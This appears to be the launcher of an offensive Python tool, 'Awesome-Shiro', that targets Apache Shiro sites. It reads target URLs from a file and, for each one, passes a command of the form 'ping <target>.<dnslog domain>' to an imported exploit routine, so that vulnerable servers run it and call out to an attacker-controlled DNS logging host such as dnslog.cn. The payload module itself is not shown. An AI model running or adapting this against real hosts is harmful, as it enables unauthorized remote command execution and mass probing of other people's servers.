# -*- coding: utf-8 -*-
# svenbeast.com
import sys

from module.main import scripts

banner='''
          __     _____          __    
  _______/  |_  /  |  |   ____ |  | __
 /  ___/\   __\/   |  |__/ ___\|  |/ /
 \___ \  |  | /    ^   /\  \___|    < 
/____  > |__| \____   |  \___  >__|_ \\
     \/            |__|      \/     \/
'''
print('Welcome To Awesome-Shiro ! ')
print(banner)
if __name__ == '__main__':
    if len(sys.argv)!=2:
        print("Usage:"+"python3 shiro.py  dnslgURL")
        print("Example:"+"python3 shiro_crack.py  1695jb.dnslog.cn")
    else:
        f=open('shiro.txt','r')
        lines=f.readlines()
        print(lines)
        f.close()
        for line in lines:
            url = line.replace('\n','')
            new_url=url.replace('http://','').replace('https://','').replace('\n','')
            command = 'ping '+new_url+'.'+sys.argv[1]
            scripts(url, command)
    
